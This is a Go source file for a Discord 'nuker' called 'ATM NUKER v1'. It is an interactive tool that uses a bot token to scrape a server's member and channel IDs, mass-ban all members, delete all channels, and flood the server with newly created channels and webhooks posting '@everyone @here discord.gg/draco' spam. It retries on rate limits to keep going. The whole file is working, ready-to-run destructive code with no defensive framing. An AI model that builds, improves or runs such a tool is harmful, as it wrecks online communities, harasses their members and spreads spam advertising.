package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Member struct {
	User User `json:"user"`
}

type User struct {
	ID string `json:"id"`
}

type Channel struct {
	ID   string `json:"id"`
	Type int    `json:"type"`
}

type WebhookResponse struct {
	ID    string `json:"id"`
	Token string `json:"token"`
}

type WebhookConfig struct {
	Name       string `json:"name"`
	AvatarURL  string `json:"avatar_url,omitempty"`
	Message    string `json:"content"`
	Username   string `json:"username,omitempty"`
}

func main() {
	fmt.Println("[$] ATM NUKER v1")
	
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("[$] Bot Token: ")
	token, _ := reader.ReadString('\n')
	token = strings.TrimSpace(token)

	fmt.Print("[$] Guild ID: ")
	guild, _ := reader.ReadString('\n')
	guild = strings.TrimSpace(guild)

	for {
		fmt.Println("\n[$] Select an option:")
		fmt.Println("[1] Ban All Members")
		fmt.Println("[2] Delete All Channels")
		fmt.Println("[3] Create Channels")
		fmt.Println("[4] Scrape Members")
		fmt.Println("[5] Scrape Channels")
		fmt.Println("[6] Do Both (Ban & Delete)")
		fmt.Println("[7] Webhook Spam Channels")
		fmt.Println("[8] Exit")
		fmt.Print("[$] Option: ")

		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		switch choice {
		case "1":
			BanAll(token, guild)
			fmt.Println("[$] Massban Complete!")
		case "2":
			DeleteChannels(token, guild)
			fmt.Println("[$] Channel Deletion Complete!")
		case "3":
			CreateChannels(token, guild)
			fmt.Println("[$] Channel Creation Complete!")
		case "4":
			ScrapeMembers(token, guild)
		case "5":
			ScrapeChannels(token, guild)
		case "6":
			BanAll(token, guild)
			DeleteChannels(token, guild)
			fmt.Println("[$] Both Requests Complete!")
		case "7":
			WebhookSpamChannels(token, guild)
			fmt.Println("[$] Webhook Spam Complete!")
		case "8":
			fmt.Println("[$] Exiting...")
			return
		default:
			fmt.Println("[!] Invalid choice. Please enter a number between 1 and 8.")
				}
		}
}

func BanAll(token, guild string) {
	fmt.Println("[$] Loading IDs")

	fmt.Print("Enter ban reason: ")
	reader := bufio.NewReader(os.Stdin)
	reason, _ := reader.ReadString('\n')
	reason = strings.TrimSpace(reason)

	file, err := os.Open("members.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	semaphore := make(chan struct{}, 50) 
	var wg sync.WaitGroup
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		wg.Add(1)
		go func(userID string) {
			defer wg.Done()
			semaphore <- struct{}{} 
			Send_BanRequest(token, guild, userID, reason)
			<-semaphore 
		}(scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Println(err) 
		return
	}

	fmt.Println("[$] Waiting for all requests to complete...")
	wg.Wait()
}

func Send_BanRequest(token, guild, user, reason string) { 
	requestURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guild, user)

	req, err := http.NewRequest("PUT", requestURL, nil)
	if err != nil {
		fmt.Printf("Error creating request for %s: %v\n", user, err)
		return
	}

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}
	req.Header.Set("Authorization", token)
	req.Header.Set("X-Audit-Log-Reason", url.QueryEscape(reason))

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for %s: %v\n", user, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("User %s - Status: %d\n", user, resp.StatusCode)

	if resp.StatusCode == 204 {
		fmt.Printf("Successfully Banned %s\n", user)
		return 
	}
	if resp.StatusCode == 429 {

		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
			} else {
				time.Sleep(100 * time.Millisecond) 
			}
		} else {
			time.Sleep(100 * time.Millisecond) 
		}
		Send_BanRequest(token, guild, user, reason)
	} else if resp.StatusCode != 204 {
		fmt.Printf("Failed to ban %s - Status: %d\n", user, resp.StatusCode)
	}

}

func DeleteChannels(token, guild string) {
	fmt.Println("[$] Loading Channel IDs")

	fmt.Print("Enter channel delete reason: ")
	reader := bufio.NewReader(os.Stdin)
	reason, _ := reader.ReadString('\n')
	reason = strings.TrimSpace(reason)

	file, err := os.Open("channels.txt")
	if err != nil {
		fmt.Println(err) 
		return
	}
	defer file.Close()

	semaphore := make(chan struct{}, 50) 
	var wg sync.WaitGroup
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		wg.Add(1)
		go func(channelID string) {
			defer wg.Done()
			semaphore <- struct{}{} 
			Send_ChannelRequest(token, guild, channelID, reason)
			<-semaphore 
		}(scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Println(err) 
		return
	}

	fmt.Println("[$] Waiting for all requests to complete...")
	wg.Wait()
}

func Send_ChannelRequest(token, guild, channel, reason string) { 
	requestURL := fmt.Sprintf("https://discord.com/api/v10/channels/%s", channel)

	req, err := http.NewRequest("DELETE", requestURL, nil)
	if err != nil {
		fmt.Printf("Error creating request for %s: %v\n", channel, err)
		return
	}

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}
	req.Header.Set("Authorization", token)
	req.Header.Set("X-Audit-Log-Reason", url.QueryEscape(reason))

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for %s: %v\n", channel, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Channel %s - Status: %d\n", channel, resp.StatusCode)

	if resp.StatusCode == 200 || resp.StatusCode == 204 {
		fmt.Printf("Successfully Deleted %s\n", channel)
		return 
	}
	if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
			} else {
				time.Sleep(100 * time.Millisecond)
			}
		} else {
			time.Sleep(100 * time.Millisecond)
		}
		Send_ChannelRequest(token, guild, channel, reason)
	} else if resp.StatusCode != 200 && resp.StatusCode != 204 {
		fmt.Printf("Failed to delete %s - Status: %d\n", channel, resp.StatusCode)
	}

}

func ScrapeMembers(token, guild string) {
	fmt.Println("[$] Scraping members...")

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}

	var allMembers []string
	after := ""

	for {
		requestURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000", guild)
		if after != "" {
			requestURL += "&after=" + after
		}

		req, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			return
		}

		req.Header.Set("Authorization", token)

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("Error sending request: %v\n", err)
			return
		}

		if resp.StatusCode != 200 {
			fmt.Printf("Error: Status %d\n", resp.StatusCode)
			resp.Body.Close()
			return
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Error reading response: %v\n", err)
			return
		}

		var members []Member
		if err := json.Unmarshal(body, &members); err != nil {
			fmt.Printf("Error parsing JSON: %v\n", err)
			return
		}

		if len(members) == 0 {
			break
		}

		for _, member := range members {
			allMembers = append(allMembers, member.User.ID)
			after = member.User.ID
		}

		fmt.Printf("Scraped %d members so far...\n", len(allMembers))

		if len(members) < 1000 {
			break
		}

		time.Sleep(100 * time.Millisecond) 
	}

	file, err := os.Create("members.txt")
	if err != nil {
		fmt.Printf("Error creating file: %v\n", err)
		return
	}
	defer file.Close()

	for _, memberID := range allMembers {
		file.WriteString(memberID + "\n")
	}

	fmt.Printf("Total members scraped: %d\n", len(allMembers))
}

func ScrapeChannels(token, guild string) {
	fmt.Println("[$] Scraping channels...")

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}

	requestURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", guild)

	req, err := http.NewRequest("GET", requestURL, nil)
	if err != nil {
		fmt.Printf("Error creating request: %v\n", err)
		return
	}

	req.Header.Set("Authorization", token)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending request: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		fmt.Printf("Error: Status %d\n", resp.StatusCode)
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return
	}

	var channels []Channel
	if err := json.Unmarshal(body, &channels); err != nil {
		fmt.Printf("Error parsing JSON: %v\n", err)
		return
	}

	file, err := os.Create("channels.txt")
	if err != nil {
		fmt.Printf("Error creating file: %v\n", err)
		return
	}
	defer file.Close()

	var channelCount int
	for _, channel := range channels {
		if channel.Type == 0 || channel.Type == 2 || channel.Type == 4 {
			file.WriteString(channel.ID + "\n")
			channelCount++
		}
	}

	fmt.Printf("Total channels scraped: %d\n", channelCount)
}

func CreateChannels(token, guild string) {
	fmt.Println("[$] Channel Creation Mode")
	fmt.Println("[1] Create from channel_names.txt file")
	fmt.Println("[2] Create multiple channels with custom name")
	fmt.Print("[$] Mode: ")

	reader := bufio.NewReader(os.Stdin)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(mode)

	switch mode {
	case "1":
		CreateFromFile(token, guild)
	case "2":
		CreateMultiple(token, guild)
	default:
		fmt.Println("[!] Invalid mode selection.")
		return
	}
}

func CreateFromFile(token, guild string) {
	fmt.Println("[$] Loading channel names from channel_names.txt")

	file, err := os.Open("channel_names.txt")
	if err != nil {
		fmt.Printf("Error: Could not open channel_names.txt - %v\n", err)
		fmt.Println("[$] Create a channel_names.txt file with one channel name per line")
		return
	}
	defer file.Close()

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}

	semaphore := make(chan struct{}, 10) 
	var wg sync.WaitGroup
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		channelName := strings.TrimSpace(scanner.Text())
		if channelName == "" {
			continue
		}

		wg.Add(1)
		go func(name string) {
			defer wg.Done()
			semaphore <- struct{}{} 
			Send_CreateChannelRequest(token, guild, name, 0)
			<-semaphore 
		}(channelName)
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading file: %v\n", err)
		return
	}

	fmt.Println("[$] Waiting for all channel creations to complete...")
	wg.Wait()
}

func CreateMultiple(token, guild string) {
	fmt.Print("[$] Channel base name: ")
	reader := bufio.NewReader(os.Stdin)
	baseName, _ := reader.ReadString('\n')
	baseName = strings.TrimSpace(baseName)

	fmt.Print("[$] Number of channels to create: ")
	countStr, _ := reader.ReadString('\n')
	countStr = strings.TrimSpace(countStr)

	count, err := strconv.Atoi(countStr)
	if err != nil || count <= 0 {
		fmt.Println("[!] Invalid number entered.")
		return
	}

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}

	semaphore := make(chan struct{}, 10) 
	var wg sync.WaitGroup

	for i := 1; i <= count; i++ {
		wg.Add(1)
		go func(num int) {
			defer wg.Done()
			semaphore <- struct{}{} 
			channelName := fmt.Sprintf("%s-%d", baseName, num)
			Send_CreateChannelRequest(token, guild, channelName, 0) 
			<-semaphore 
		}(i)
	}

	fmt.Println("[$] Waiting for all channel creations to complete...")
	wg.Wait()
}

func Send_CreateChannelRequest(token, guild, name string, channelType int) {
	requestURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", guild)

	requestBody := fmt.Sprintf(`{"name":"%s","type":%d}`, name, channelType)

	req, err := http.NewRequest("POST", requestURL, strings.NewReader(requestBody))
	if err != nil {
		fmt.Printf("Error creating request for %s: %v\n", name, err)
		return
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for %s: %v\n", name, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Channel %s - Status: %d\n", name, resp.StatusCode)

	if resp.StatusCode == 201 {
		fmt.Printf("Successfully Created channel: %s\n", name)
		return
	}
	if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
			} else {
				time.Sleep(1 * time.Second)
			}
		} else {
			time.Sleep(1 * time.Second)
		}
		Send_CreateChannelRequest(token, guild, name, channelType)
	} else {
		fmt.Printf("Failed to create channel %s - Status: %d\n", name, resp.StatusCode)
	}
}

func WebhookSpamChannels(token, guild string) {
	webhookConfig := WebhookConfig{
		Name:      "ATM NUKER v1",                                               
		AvatarURL: "https://cdn.discordapp.com/attachments/1076920453928603812/1410103882830315591/IMG_7327.jpg?ex=68b075d4&is=68af2454&hm=8c2db0921e5a53a9ba8ed1479b6e708efb6106350e14059b1d2f270643e09c2f&",  
		Message:   "@everyone @here discord.gg/draco",                     
		Username:  "/draco",               
	}

	fmt.Print("[$] Channel Name: ")
	reader := bufio.NewReader(os.Stdin)
	baseName, _ := reader.ReadString('\n')
	baseName = strings.TrimSpace(baseName)

	fmt.Print("[$] Number of channels to create: ")
	countStr, _ := reader.ReadString('\n')
	countStr = strings.TrimSpace(countStr)

	count, err := strconv.Atoi(countStr)
	if err != nil || count <= 0 {
		fmt.Println("[!] Invalid number entered.")
		return
	}

	fmt.Print("[$] Number of webhook messages per channel: ")
	msgCountStr, _ := reader.ReadString('\n')
	msgCountStr = strings.TrimSpace(msgCountStr)

	msgCount, err := strconv.Atoi(msgCountStr)
	if err != nil || msgCount <= 0 {
		fmt.Println("[!] Invalid number entered.")
		return
	}

	if !strings.HasPrefix(token, "Bot ") && !strings.HasPrefix(token, "Bearer ") {
		token = "Bot " + token
	}

	semaphore := make(chan struct{}, 15) 
	
	var wg sync.WaitGroup

	for i := 1; i <= count; i++ {
		wg.Add(1)
		go func(num int) {
			defer wg.Done()
			semaphore <- struct{}{} 
			channelName := fmt.Sprintf("%s-%d", baseName, num)
			CreateChannelAndSpam(token, guild, channelName, webhookConfig, msgCount)
			<-semaphore 
			time.Sleep(200 * time.Millisecond) 
		}(i)
	}

	fmt.Println("[$] Waiting for all webhook spam operations to complete...")
	wg.Wait()
}

func CreateChannelAndSpam(token, guild, channelName string, config WebhookConfig, msgCount int) {
	channelID := CreateChannelForWebhook(token, guild, channelName)
	if channelID == "" {
		return
	}

	time.Sleep(500 * time.Millisecond)

	webhookURL := CreateWebhook(token, channelID, config.Name, config.AvatarURL)
	if webhookURL == "" {
		return
	}

	time.Sleep(500 * time.Millisecond)

	for i := 1; i <= msgCount; i++ {
		SendWebhookMessage(webhookURL, config)
		time.Sleep(100 * time.Millisecond) 

		if i%25 == 0 {
			fmt.Printf("Sent %d/%d messages in %s\n", i, msgCount, channelName)
		}
	}

	fmt.Printf("Completed spam for channel: %s\n", channelName)
}

func CreateChannelForWebhook(token, guild, name string) string {
	requestURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", guild)
	requestBody := fmt.Sprintf(`{"name":"%s","type":0}`, name)

	req, err := http.NewRequest("POST", requestURL, strings.NewReader(requestBody))
	if err != nil {
		fmt.Printf("Error creating channel request for %s: %v\n", name, err)
		return ""
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending channel request for %s: %v\n", name, err)
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 201 {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Error reading channel response for %s: %v\n", name, err)
			return ""
		}

		var channel Channel
		if err := json.Unmarshal(body, &channel); err != nil {
			fmt.Printf("Error parsing channel JSON for %s: %v\n", name, err)
			return ""
		}

		fmt.Printf("Created channel: %s (ID: %s)\n", name, channel.ID)
		return channel.ID
	} else if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				fmt.Printf("Channel creation rate limited for %d seconds\n", seconds)
				time.Sleep(time.Duration(seconds)*time.Second + 1*time.Second)
			} else {
				time.Sleep(5 * time.Second)
			}
		} else {
			time.Sleep(2 * time.Second)
		}
		return CreateChannelForWebhook(token, guild, name)
	} else {
		fmt.Printf("Failed to create channel %s - Status: %d\n", name, resp.StatusCode)
		return ""
	}
}

func CreateWebhook(token, channelID, name, avatarURL string) string {
	requestURL := fmt.Sprintf("https://discord.com/api/v10/channels/%s/webhooks", channelID)

	requestBody := fmt.Sprintf(`{"name":"%s"}`, name)

	req, err := http.NewRequest("POST", requestURL, strings.NewReader(requestBody))
	if err != nil {
		fmt.Printf("Error creating webhook request for %s: %v\n", name, err)
		return ""
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending webhook request for %s: %v\n", name, err)
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Error reading webhook response for %s: %v\n", name, err)
			return ""
		}

		var webhook WebhookResponse
		if err := json.Unmarshal(body, &webhook); err != nil {
			fmt.Printf("Error parsing webhook JSON for %s: %v\n", name, err)
			return ""
		}

		webhookURL := fmt.Sprintf("https://discord.com/api/webhooks/%s/%s", webhook.ID, webhook.Token)
		fmt.Printf("Created webhook for channel: %s\n", name)
		return webhookURL
	} else if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				fmt.Printf("Webhook creation rate limited for %d seconds\n", seconds)
				time.Sleep(time.Duration(seconds)*time.Second + 1*time.Second)
			} else {
				time.Sleep(5 * time.Second)
			}
		} else {
			time.Sleep(2 * time.Second)
		}
		return CreateWebhook(token, channelID, name, avatarURL)
	} else {
		fmt.Printf("Failed to create webhook for %s - Status: %d\n", name, resp.StatusCode)
		return ""
	}
}

func SendWebhookMessage(webhookURL string, config WebhookConfig) {
	var requestBody string
	if config.Username != "" {
		requestBody = fmt.Sprintf(`{"content":"%s","username":"%s"}`, config.Message, config.Username)
	} else {
		requestBody = fmt.Sprintf(`{"content":"%s"}`, config.Message)
	}

	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(requestBody))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		if retryAfter != "" {
			if seconds, err := strconv.Atoi(retryAfter); err == nil {
				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
			} else {
				time.Sleep(1 * time.Second)
			}
		} else {
			time.Sleep(500 * time.Millisecond)
		}
		SendWebhookMessage(webhookURL, config)
	}
}
